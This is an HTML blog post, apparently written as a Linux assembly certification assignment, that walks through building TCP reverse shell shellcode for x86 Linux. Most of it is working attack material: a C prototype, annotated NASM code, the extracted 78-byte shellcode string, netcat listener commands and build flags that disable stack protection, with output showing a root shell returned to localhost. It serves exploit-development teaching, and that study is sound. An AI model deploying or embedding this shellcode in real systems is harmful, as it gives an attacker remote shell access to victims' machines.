@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>    Creating TCP reverse shell shellcode (SLAE, Assignment #2)
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="http://unlim.xyz/theme/css/cid.css">
+        <link href="http://unlim.xyz/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Nomad Atom Feed" />
+        
+ 
+        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="/icons/manifest.json">
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="/icons/browserconfig.xml">
+        <meta name="theme-color" content="#ffffff">
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="http://unlim.xyz/">Security Nomad</a></h1>
+    <p> Wandering the cyber security realm </p>
+    <nav>
+        <a href="http://unlim.xyz/categories.html">CATEGORIES</a>
+        <a href="http://unlim.xyz/tags.html">TAGS</a>
+        <a href="http://unlim.xyz/archives.html">ARCHIVES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Creating TCP reverse shell shellcode (SLAE, Assignment #2)</h1>
+            <p class="category">
+                Category: <a class="category" href="http://unlim.xyz/category/slae.html"><b>SLAE</b></a>
+            </p>
+            <p class="date">
+                Written on <time datetime="2015-10-05T21:00:00-04:00">Oct 05, 2015</time>
+            </p>
+        </header>
+
+        <article>
+            <p>I remember when I was first introduced to the concept of the reverse shell it was a bit difficult to wrap my mind around it. The reverse shell is called so because instead of attacker connecting to the victim machine, the victim machine initiates a connection to attacking machine. The shell-throwing direction is reversed in this case. Reverse shell's main purpose is to circumvent firewalls that blindly allow outgoing traffic without proper filtering. </p>
+<p>It turned out that the code for the reverse shell is actually simpler than that of the <a href="/blog/building-tcp-bind-shell-shellcode/">bind TCP shell</a> I wrote about in a previous post. It is also shorter. </p>
+<p>Here comes the prototype C program that we will base our Assembly code on. Code is pretty simple, but nevertheless I furnished it with comments:</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;strings.h&gt;</span>
+<span class="cp">#include &lt;sys/socket.h&gt;</span>
+<span class="cp">#include &lt;netinet/in.h&gt;</span>
+
+<span class="cp">#define ADDR &quot;127.0.0.1&quot;</span>
+<span class="cp">#define PORT 1234</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="c1">// Create socket for outgoing connection </span>
+    <span class="kt">int</span> <span class="n">conn_sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span> 
+
+    <span class="c1">// Populate server side connection information    </span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
+    <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">// IPv4</span>
+    <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">);</span> <span class="c1">// IP address: localhost</span>
+    <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>  <span class="c1">// Port # </span>
+
+    <span class="c1">// Initiate connection</span>
+    <span class="n">connect</span><span class="p">(</span><span class="n">conn_sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+
+    <span class="c1">// Forward process&#39;s stdin, stdout and stderr to the incoming connection</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">conn_sock</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">conn_sock</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">conn_sock</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+
+    <span class="c1">// Run shell</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>After compilation we can use Netcat to test that the code is working:</p>
+<div class="highlight"><pre><span class="c"># Start Netcat in one console window</span>
+nc -lvp 1234
+
+<span class="c"># Compile and start the C reverse shell implementation</span>
+gcc -o revshell revshell.c <span class="o">&amp;&amp;</span> ./revshell
+
+<span class="c"># Back in the console with Netcat you should get a connection. Test if it works:</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 35476
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+^C
+</pre></div>
+
+
+<p>One thing to remember from the previous post on bind TCP shell is that <code>socket</code> and <code>connect</code> functions are plugged into the <code>socketcall</code> system call. And basically we can largely reuse the bind shell source code making relevant changes to it. The changes include removing blocks for listen and accept functions, transforming bind function block to connect and replacing the address from 0.0.0.0 to 127.1.1.1. The 127.1.1.1 is equivalent to 127.0.0.1 localhost address, with an advantage of eliminating zeroes. Some people think that only 127.0.0.1 address refers to the localhost, while in truth all valid IPv4 address beginning with 127 are synonyms and refer to the same localhost address. </p>
+<p>After applying the aforementioned changes here is what I got (follow the comments if it is not clear what's going on):</p>
+<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+    <span class="k">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nl">addr:</span> <span class="nf">equ</span> <span class="mh">0x0101017F</span> <span class="c1">; = 127.1.1.1 in little endian notation</span>
+    <span class="nl">port:</span> <span class="nf">equ</span> <span class="mh">0xD204</span> <span class="c1">; = 1234 in little endian notation</span>
+
+    <span class="c1">; Reference: socketcall(int call, unsigned long *args)</span>
+
+    <span class="c1">; Create socket: EAX = socket(AF_INET, SOCK_STREAM, 0)</span>
+    <span class="c1">; On success EAX will contain socket file descriptor</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>  <span class="c1">; zero out ebx</span>
+    <span class="nf">mul</span> <span class="nb">ebx</span>       <span class="c1">; implicitly zero out eax and edx </span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>  <span class="c1">; socketcall syscall #</span>
+    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>   <span class="c1">; socket function #</span>
+    <span class="nf">push</span> <span class="nb">edx</span>      <span class="c1">; 3rd arg to socket function</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x1</span> <span class="c1">; SOCK_STREEAM - 2nd arg to socket function</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x2</span> <span class="c1">; 1st arg: socket domain = 2 (AF_INET)</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>  <span class="c1">; Copy args address to ECX </span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+    <span class="c1">; Try establishing a connection to a remote host  </span>
+    <span class="c1">; EAX = connect(conn_sock, &amp;sockaddr_in, sizeof(sockaddr_in))</span>
+    <span class="c1">; EAX will be 0 on success</span>
+    <span class="nf">xchg</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>  <span class="c1">; Save socket fd to edx; eax is all 0s now</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>   <span class="c1">; socketcall syscall #</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>        <span class="c1">; Reusing 1st arg of the prev func (2)</span>
+    <span class="nf">pop</span> <span class="nb">esi</span>        <span class="c1">; Trashing 4 bytes from the stack </span>
+    <span class="nf">push</span> <span class="nv">addr</span>      <span class="c1">; sockaddr_in.sin_addr.s_addr = 127.1.1.1 (4 bytes) </span>
+    <span class="nf">push</span> <span class="kt">word</span> <span class="nv">port</span> <span class="c1">; sockaddr_in.sin_port = 1234 (2 bytes)</span>
+    <span class="nf">push</span> <span class="kt">word</span> <span class="nb">bx</span>   <span class="c1">; sin_family = 2 (AF_INET) (2 bytes)</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">16</span>   <span class="c1">; addr_len = 16 (structure size) (we don&#39;t care about last 8 bytes)</span>
+    <span class="nf">push</span> <span class="nb">ecx</span>       <span class="c1">; ECX points to right address, no need to set or change it</span>
+    <span class="nf">push</span> <span class="nb">edx</span>       <span class="c1">; Socket fd </span>
+                   <span class="c1">; Stack is now 0x0000000 [0x00000000, 0xd204, 0x0002], </span>
+                   <span class="c1">; 0x00000010, &amp;sockaddr_in, socketfd</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>   <span class="c1">; Copy listening socket descriptor address to ECX </span>
+    <span class="nf">inc</span> <span class="nb">ebx</span>        <span class="c1">; connect func # (3)</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>               
+
+    <span class="c1">; Redirect process&#39;s stdin/out/err to the incoming socket   </span>
+    <span class="nf">xchg</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>  <span class="c1">; 1st syscall arg in EBX = outgoing socket fd</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">2</span>
+<span class="nl">.next_fd:</span>          <span class="c1">; Redirect all process&#39;s fds ot incoming socket fd</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>   <span class="c1">; dup2 syscall #</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>        
+    <span class="nf">dec</span> <span class="nb">ecx</span>         
+    <span class="nf">jns</span> <span class="nv">.next_fd</span>   <span class="c1">; loop until ECX == -1 </span>
+
+    <span class="c1">; Start the shell </span>
+    <span class="nf">push</span> <span class="nb">edi</span>               <span class="c1">; push some delimiting nulls</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f2f</span>  <span class="c1">; push /bin//sh string </span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>  
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>           <span class="c1">; 1st syscall arg: program address</span>
+    <span class="nf">push</span> <span class="nb">edi</span>               <span class="c1">; push delimiting nulls </span>
+    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>           <span class="c1">; 3rd syscall arg: env vars  </span>
+    <span class="nf">push</span> <span class="nb">ebx</span>               <span class="c1">; Push program address string creating args array</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>           <span class="c1">; 2nd syscall arg: args</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="c1">; execve syscall #</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></div>
+
+
+<p>Now let's build the binary and extract and thest the shellcode to make sure that we did not miss anything. </p>
+<div class="highlight"><pre><span class="c"># Build a binary and extract the shellcode </span>
+nasm -f elf revshell.asm <span class="o">&amp;&amp;</span> ld -o revshell revshell.o
+scdump revshell
+</pre></div>
+
+
+<p>Output of the above command (formatted to fit the screen):</p>
+<div class="highlight"><pre>Length:  78
+Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&quot;
+&quot;\x92\xb0\x66\x5b\x5e\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x6a\x10\x51&quot;
+&quot;\x52\x89\xe1\x43\xcd\x80\x87\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9&quot;
+&quot;\x57\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x89\xe2\x53\x89\xe1&quot;
+&quot;\xb0\x0b\xcd\x80&quot;
+</pre></div>
+
+
+<div class="divider"></div>
+
+<div class="highlight"><pre><span class="c"># Paste the shellcode into the scframe.c and compile it:</span>
+gcc -fno-stack-protector -z execstack -o scframe scframe.c
+
+<span class="c"># In another console window start Netcat listener</span>
+nc -lvp 1234
+
+<span class="c"># Back in the window where you compiled the scframe launch it</span>
+./scframe
+
+<span class="c"># Check the Netcat listener to see if you got a reverse shell connection</span>
+nc -lvp 1234
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+connect to <span class="o">[</span>127.1.1.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 33275
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+^C
+</pre></div>
+
+
+<p>Everything seems to be working. Off we go to the next assignment of creating <a href="/assembly-custom-encoding-scheme.html">a custom encoder</a>!</p>
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<p><hr>
+This blog post was created for completing the requirements of the <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert</a> certification. Student id: SLAE-685.</p>
+<p>The source files created while completing the assignment can be found in my <a href="https://github.com/reider-roque/slae">GitHub repository</a>.</p>
+        </article>
+
+        <footer>
+            <p>
+                Tags:  
+ 
+                    <a class="tag" href="/tag/exploit-development.html">exploit-development</a>
+ 
+                    <a class="tag" href="/tag/slae.html">slae</a>
+            </p>
+        </footer>
+
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+                <li><a href="http://unlim.xyz/blog/">Blog</a></li>
+            <li><a href="https://github.com/reider-roque">Github</h3>
+            </a></li>
+            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
+            </a></li>
+    <script type="text/javascript">
+        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
+        document.write( "<yv><n uers=\"znvygb:byrt@hayvz.klm\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
+    </script>
+    </ul>
+
+    <p class="disclaimer">
+    Oleg Mitrofanov &copy; 2015
+    </p>
+</footer>
+            </div>
+    </body>
+</html>
